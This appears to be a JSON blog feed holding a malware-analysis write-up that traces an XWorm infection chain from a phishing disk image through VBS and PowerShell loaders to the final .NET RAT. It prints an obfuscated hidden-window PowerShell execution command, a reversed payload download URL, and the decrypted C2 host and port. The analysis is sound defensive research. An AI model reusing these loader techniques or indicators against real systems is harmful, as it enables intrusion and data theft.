{"version":"https://jsonfeed.org/version/1.1","title":"Kryptoenix","home_page_url":"https://localhost:5173","feed_url":"https://localhost:5173/feed.json","description":"Powered by SvelteKit/Urara","icon":"https://localhost:5173/assets/kryptoenix@512.png","favicon":"https://localhost:5173/favicon.png","authors":[{"name":"Kryptoenix","url":"https://localhost:5173","avatar":"/assets/kryptoenix@512.png"}],"language":"en-US","items":[{"id":"first-post","url":"https://localhost:5173/first-post","title":"Hunting in the wild - XWorm new variant","content_html":"<h2 id=\"introduction\" data-svelte-h=\"svelte-ccveyw\"><a href=\"#introduction\">Introduction</a></h2> <p data-svelte-h=\"svelte-l0ad4k\">Hello there, welcome to the board! I’m openning this blog series with an exciting topic: malware analysis. I will start by collecting pieces for our puzzle and continue to combine them until, by the end of journey, each piece contributes to the bigger picture.</p> <p data-svelte-h=\"svelte-1onww4q\"><a href=\"https://bazaar.abuse.ch/\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">MalwareBazaar</a> website provides a large database of malware samples, where researchers can report different files which might seem suspicious. Today, while I was searching for potential subject for analysis, I stumbled upon an interesting archive. This was found as part of an email attachment in a malware campaign. The sample can be found <a href=\"https://bazaar.abuse.ch/sample/76fbfcb8754ba7e23c855a71db83aae75c106d84e106330b772cf3a28a440993/#comments\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">here</a>.</p> <h2 id=\"first-sign-of-malicious-code\" data-svelte-h=\"svelte-143uk5j\"><a href=\"#first-sign-of-malicious-code\">First sign of malicious code</a></h2> <p data-svelte-h=\"svelte-1qw7k5v\">The initial archive contains a disk image (<code>.img</code>) file, a known format for executing code once the victim clicks the file. If this is not yet suspicious, let’s inspect for visible signs that might indicate unwanted behaviour such as download links. For this step, I used a powerful utiliy called <code>binwalk</code>, capable of extracting bundled files.</p> <!-- HTML_TAG_START --><pre class=\"shiki material-default with-title\" shell=\"true\" title=\"extract files from disk image\"><div class='code-title'>extract files from disk image</div><div class=\"language-id\">shell</div><div class='code-container'><code><div class='line'>binwalk -e Damaged_item.img</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h=\"svelte-1h3vs2a\">Now, a new folder <code>iso-root</code> contains a friendly-looking <code>VBS</code> script.</p> <img src=\"damaged-itemvbs.png\" alt=\"image\" class=\"svelte-e0dhad\"> <p data-svelte-h=\"svelte-gqvjlb\">The script simply tries to download the content found at a Pastebin link and then execute the fetched code using <code>ExecuteGlobal</code> function. Good news, the link was suspended and therefore, the following code cannot be executed anymore, preventing victims from infection. Defenders and Pastebin support did great work in such a short period of time (less than 18h :)). Fortunately, I was able to extract the next stage of <code>VBS</code> code (the code from Pastebin link) before removal. Let’s analyse it!</p> <img src=\"fetched-vbs.png\" alt=\"image\" class=\"svelte-e0dhad\"> <p data-svelte-h=\"svelte-71phqk\">We are dealing with some obfuscation, so it would be faster if we can find a way to print the final code (after deobfuscation, but before execution). This way, we can get a clear understanding of what’s under the hood. Some hints suggest that deobfuscated code is <code>powershell</code>. The plan is to write the final code to a powershell script.</p> <!-- HTML_TAG_START --><pre class=\"shiki material-default with-title\" js=\"true\" title=\"code appended to the end of obfuscated VBS\"><div class='code-title'>code appended to the end of obfuscated VBS</div><div class=\"language-id\">js</div><div class='code-container'><code><div class='line'>Set fso = CreateObject(\"Scripting.FileSystemObject\")</div><div class='line'>Set outputFile = fso.CreateTextFile(\"deobfuscated.ps1\", True)</div><div class='line'>outputFile.WriteLine durguete</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h=\"svelte-rqfhvz\">Once we append this code and execute the whole script, <code>deobfuscated.ps1</code> file will help us in the next stage.</p> <h2 id=\"new-language-old-friend\" data-svelte-h=\"svelte-1wjvziz\"><a href=\"#new-language-old-friend\">New language, old friend</a></h2> <p data-svelte-h=\"svelte-1r2u4qj\">It becomes clear that attacker tries to hide as much as possible by adding polimorphic code, with many layers of obfuscation. The recovered <code>PS1</code> script replaces some substrings in <code>$codigo</code> string, decodes it in <code>base64</code> and executes the code using a classic powershell technique.</p> <!-- HTML_TAG_START --><pre class=\"shiki material-default\" powershell=\"true\"><div class=\"language-id\">powershell</div><div class='code-container'><code><div class='line'>powershell -command \"$codigo = 'ZgB1DgTreG4DgTreYwB0DgTreGkDgTrebw &lt;-- stripped --&gt; eKQB9DgTreCDgTreDgTrefQDgTre=';$oWjuxd = [system.Text.encoding]::Unicode.GetString([system.convert]::Frombase64string( $codigo.replace('DgTre','A') ));powershell.exe -windowstyle hidden -executionpolicy bypass -Noprofile -command $OWjuxD\"</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h=\"svelte-5hhyp2\">After decoding, we are left with another powershell script. It is more verbose than the previous one.</p> <img src=\"deobfs2.png\" alt=\"image\" class=\"svelte-e0dhad\"> <p data-svelte-h=\"svelte-ge3kz\">Let’s break it into smaller pieces. The variable <code>@links</code> contains links used by <code>DownloadDataFromLinks</code> function to download an image (chosen at random). Now comes the interesting part. The actual downloaded image contain an embedded <code>.NET</code> assembly (<code>$loadedAssembly</code> and <code>GetMethod</code> are clear signs that we are dealing with .NET code). I will adapt this PS1 script such that, after downloading and decoding are complete, variable <code>$commandBytes</code> will write its content to an output file <code>malware-net</code>. Below is a small snippet of what’s being changed in the original code:</p> <!-- HTML_TAG_START --><pre class=\"shiki material-default\" js=\"true\"><div class=\"language-id\">js</div><div class='code-container'><code><div class='line'>if ($startIndex -ge 0 -and $endIndex -gt $startIndex) &#123;</div><div class='line'>                $startIndex += $startFlag.Length;</div><div class='line'>                $base64Length = $endIndex - $startIndex;</div><div class='line'>                $base64Command = $imageText.Substring($startIndex, $base64Length);</div><div class='line'>                $commandBytes = [System.Convert]::FromBase64String($base64Command);</div><div class='line'>                $commandBytes | Out-File -FilePath \"malware-net\"</div><div class='line'>                &#125;</div><div class='line'>            &#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h=\"svelte-pbeqsv\">Additional decoding is required in order to extract the assembly properly. For that, CyberChef will simplify things a lot using <a href=\"https://gchq.github.io/CyberChef/#recipe=Decode_text('UTF-16LE%2520(1200)')Find_/_Replace(%257B'option':'Regex','string':'%255C%255Cr%255C%255Cn'%257D,'%2520',true,false,true,false)From_Decimal('Space',false)\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">this recipe</a>.</p> <h2 id=\"decompiling-the-culprit\" data-svelte-h=\"svelte-1akbftj\"><a href=\"#decompiling-the-culprit\">Decompiling the culprit</a></h2> <p data-svelte-h=\"svelte-12llahp\">We take a look at the first bytes and notice that they represent the file signature for an executable <code>.EXE</code>. Inspect it’s properties to gain new insights.</p> <img src=\"malware.png\" alt=\"image\" class=\"svelte-e0dhad\"> <p data-svelte-h=\"svelte-y4xqpq\">Seems like this campaign is addressed to spanish speaking victims. Maybe it was sent to employees of some companies since the description is related to <code>Automation project</code>?</p> <p data-svelte-h=\"svelte-1fc9qni\">So far, the executable won’t pose dificulties because it’s written in an intepreted language, making it easier to retrieve the original code. <a href=\"https://github.com/icsharpcode/ILSpy\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">ILSpy</a> is a great tool for decompiling .NET binaries, suitable for our purpose. (Open the image in a new tab if you don’t see the code)</p> <img src=\"decompiled1.png\" alt=\"image\" class=\"svelte-e0dhad\"> <p data-svelte-h=\"svelte-23ztk8\">This is one functionality of the binary through which the malware tries to gain persistence by abusing widely-known start-up registry <code>SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>. Other functionalities found include: using D/Invoke syscall, creating new processes under the path of <code>cmd.exe</code> and another one related to .NET framework.</p> <img src=\"malhelper.png\" alt=\"image\" class=\"svelte-e0dhad\"> <p data-svelte-h=\"svelte-yzv1ld\">Remember that in previously discussed powershell script, a method was invoked on this assembly, <code>VAI</code>:</p> <!-- HTML_TAG_START --><pre class=\"shiki material-default with-title\" js=\"true\" title=\"snipped from second powershell script\"><div class='code-title'>snipped from second powershell script</div><div class=\"language-id\">js</div><div class='code-container'><code><div class='line'>$method = $type.GetMethod('VAI').Invoke($null, [object[]]('441ae23bb6fe-0269-74a4-c2ae-4ebc2dab=nekot&aidem=tla?txt.102061mrowxnhoj/o/moc.topsppa.64038-metsys-eciovni/b/0v/moc.sipaelgoog.egarotsesaberif//:sptth', '1', 'C:ProgramData' , 'Name ',' AddInProcess32 ',' '))&#125; &#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h=\"svelte-v92x8g\">In ILSpy, we can see that <code>VAI</code> is responsible for reversing and downloading the file from link. After that, the file obtained is reversed and decoded in base64.</p> <img src=\"toolsmal.png\" alt=\"image\" class=\"svelte-e0dhad\"> <h2 id=\"searching-for-keys\" data-svelte-h=\"svelte-bjozqq\"><a href=\"#searching-for-keys\">Searching for keys?</a></h2> <p data-svelte-h=\"svelte-e5k1l8\">This hunting brought us to a new .NET binary. We can confirm its signature, in Kali:</p> <!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line highlight'>[kali@kali -]$ file mal2.exe</div><div class='line dim'>mal2.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h=\"svelte-1dnjm7i\">Through decompilation, we find a vast number of functions related to malitious behaviour. In <code>Main</code> function, some variables are decrypted using <code>AES</code> in <code>ECB mode</code>. These “setting” variables will be used later in establishing connections between victim and attacker’s C&amp;C infrastructure.</p> <img src=\"worm1.png\" alt=\"image\" class=\"svelte-e0dhad\"> <img src=\"worm2.png\" alt=\"image\" class=\"svelte-e0dhad\"> <p data-svelte-h=\"svelte-y5a8fg\">Based on the known values of encrypted strings and encoded key, it is possible to recover the plaintext values using a similar decryption routine used in encryption:</p> <!-- HTML_TAG_START --><pre class=\"shiki material-default\" csharp=\"true\"><div class=\"language-id\">csharp</div><div class='code-container'><code><div class='line'>using System;</div><div class='line'>using System.Security.Cryptography;</div><div class='line'>using System.Text;</div><div class='line'></div><div class='line'>public class Settings</div><div class='line'>&#123;</div><div class='line'>    public static string Host = \"8wEbreuCNstcX+VMVrMtN79nabenssi23ZA2UwI0sBw=\";</div><div class='line'></div><div class='line'>    public static string Port = \"NHj6D/XmlURhrDZN4bCpqA==\";</div><div class='line'></div><div class='line'>    public static string KEY = \"tGwHQrFuqEZ9E5eQxvPElQ==\";</div><div class='line'></div><div class='line'>    public static string SPL = \"A6XU+/uh3DsQy74ojVhAhQ==\";</div><div class='line'></div><div class='line'>    public static int Sleep = 3;</div><div class='line'></div><div class='line'>    public static string USBNM = \"k6tUhyBB8c9OnCp0im2vjw==\";</div><div class='line'></div><div class='line'>    public static string Mutex = \"mrkh245537gVoEKF\";</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>public class AlgorithmAES</div><div class='line'>&#123;</div><div class='line'>    public static string Decrypt(string input)</div><div class='line'>    &#123;</div><div class='line'>        RijndaelManaged rijndaelManaged = new RijndaelManaged();</div><div class='line'>        MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();</div><div class='line'>        byte[] array = new byte[32];</div><div class='line'>        byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(UTF8SB(Settings.Mutex));</div><div class='line'>        Array.Copy(sourceArray, 0, array, 0, 16);</div><div class='line'>        Array.Copy(sourceArray, 0, array, 15, 16);</div><div class='line'>        rijndaelManaged.Key = array;</div><div class='line'>        rijndaelManaged.Mode = CipherMode.ECB;</div><div class='line'>        ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();</div><div class='line'>        byte[] array2 = Convert.FromBase64String(input);</div><div class='line'>        byte[] decryptedBytes = cryptoTransform.TransformFinalBlock(array2, 0, array2.Length);</div><div class='line'>        return UTF8BS(decryptedBytes);</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>    private static byte[] UTF8SB(string s)</div><div class='line'>    &#123;</div><div class='line'>        return Encoding.UTF8.GetBytes(s);</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>    private static string UTF8BS(byte[] b)</div><div class='line'>    &#123;</div><div class='line'>        return Encoding.UTF8.GetString(b);</div><div class='line'>    &#125;</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>public class Main2</div><div class='line'>&#123;</div><div class='line'>    public static void Main()</div><div class='line'>    &#123;</div><div class='line'>        Settings.Host = AlgorithmAES.Decrypt(Settings.Host);</div><div class='line'>        Console.WriteLine(\"Decrypted Host: \" + Settings.Host);</div><div class='line'>        Settings.Port = AlgorithmAES.Decrypt(Settings.Port);</div><div class='line'>        Console.WriteLine(\"Decrypted Port: \" + Settings.Port);</div><div class='line'>        Settings.KEY = AlgorithmAES.Decrypt(Settings.KEY);</div><div class='line'>        Console.WriteLine(\"Decrypted KEY: \" + Settings.KEY);</div><div class='line'>        Settings.SPL = AlgorithmAES.Decrypt(Settings.SPL);</div><div class='line'>        Console.WriteLine(\"Decrypted SPL: \" + Settings.SPL);</div><div class='line'>        Settings.USBNM = AlgorithmAES.Decrypt(Settings.USBNM);</div><div class='line'>        Console.WriteLine(\"Decrypted USBNM: \" + Settings.USBNM);</div><div class='line'>    &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h=\"svelte-sv5aos\">Finally, we can reveal the malware family used by threat actors:</p> <!-- HTML_TAG_START --><pre class=\"shiki material-default with-title\" bash=\"true\" title=\"decrypted strings\"><div class='code-title'>decrypted strings</div><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line dim'>Decrypted Host: xwv5group7001.duckdns.org</div><div class='line dim'>Decrypted Port: 7001</div><div class='line dim'>Decrypted KEY: &lt;123456789&gt;</div><div class='line highlight'>Decrypted SPL: &lt;Xwormmm&gt;</div><div class='line dim'>Decrypted USBNM: USB.exe</div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h=\"svelte-3hipc8\">Taking a closer look at its functions in ILSpy, we find that it’s indeed <code>XWorm</code>. On internet, there is already a lot of research done on this malware. Even though, I will mention some of its capabilities: recording keystrokes, printscreens at specific interval of time and sending them to the attacker at random time (this jitter can be useful for bypassing network monitoring solutions). <code>Trellix</code> covered more rigorously this topic <a href=\"https://www.trellix.com/blogs/research/old-loader-new-threat-exploring-xworm/\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">here</a>.</p> <h2 id=\"conclusion\" data-svelte-h=\"svelte-kmpttn\"><a href=\"#conclusion\">Conclusion</a></h2> <p data-svelte-h=\"svelte-20trsz\">The hunt is not over yet since we have valuable informations to work with. For instance, <code>xwv5group7001.duckdns.org</code> is a domain name registered by the attacker. It might provide additional information about his real identity, through OSINT techniques. Maybe the C2 infrastructured is poorly configured, leaving it vulnerable to attacks from defenders who are investigating this case. What about other clues left behind during this analysis process?</p> <p data-svelte-h=\"svelte-tpm7dn\">Our jorney will end here for now, but it is worth investigating what hasn’t been covered in this post. Sometimes you end up finding interesting information:). Thank you for your undivided attention during this reading and don’t hesitate to contact me on social media for questions or feedback. Best wishes until next time!</p> <div class=\"relative w-auto min-h-48 rounded-box overflow-hidden bg-gradient-to-b from-primary to-secondary text-primary-content transition-shadow duration-200 shadow-xl hover:shadow-2xl p-4 md:p-8 my-4\"><div class=\"absolute -top-4 opacity-10 text-[12rem] text-neutral leading-tight rotate-[30deg]\">Kryptoenix</div> <div class=\"avatar mb-4\"><div class=\"rounded-full border-2 border-white shadow-xl w-16 h-16\"><img class=\"hover:rotate-[360deg] transition-transform duration-1000 ease-in-out m-0\" src=\"/assets/kryptoenix@512.png\" alt=\"Kryptoenix\" loading=\"lazy\" decoding=\"async\"></div></div> <div class=\"opacity-50\">KE</div> <div class=\"text-2xl mb-2\">Kryptoenix</div> <div><!-- HTML_TAG_START --><!-- HTML_TAG_END --></div> <div class=\"flex flex-col md:flex-row gap-4 mt-4 justify-center\" data-svelte-h=\"svelte-l8738u\"><a href=\"https://t.me/kwaabot\" rel=\"noopener external\" target=\"_blank\" class=\"flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#26a5e4] hover:bg-[#0088cc] flex items-center\"><span class=\"i-simple-icons-telegram absolute w-16 h-16 left-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125\"></span> <span class=\"z-10 !text-white\">@kryptoenix</span></a> <a href=\"https://discord.com/users/349550824202043392\" rel=\"noopener external\" target=\"_blank\" class=\"flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#5865f2] hover:bg-[#7983f5] flex items-center\"><span class=\"i-simple-icons-discord absolute w-16 h-16 right-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125\"></span> <span class=\"z-10 !text-white\">Kryptoenix#1929</span></a> <a href=\"https://t.me/kwaabot\" rel=\"noopener external\" target=\"_blank\" class=\"flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#424040] hover:bg-[#757272] flex items-center\"><span class=\"i-simple-icons-telegram absolute w-16 h-16 left-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125\"></span> <span class=\"z-10 !text-white\">📂 Kryptoenix</span></a></div></div>","summary":"A fresh iteration of XWorm emerges, masquerading as an automation project within nefarious email attachments.","image":"/assets/image1.jpeg","date_published":"2024-02-17T00:00:00.000Z","date_modified":"2024-02-17T00:00:00.000Z","tags":["malware analysis","xworm"],"_indieweb":{"type":"article"}}]}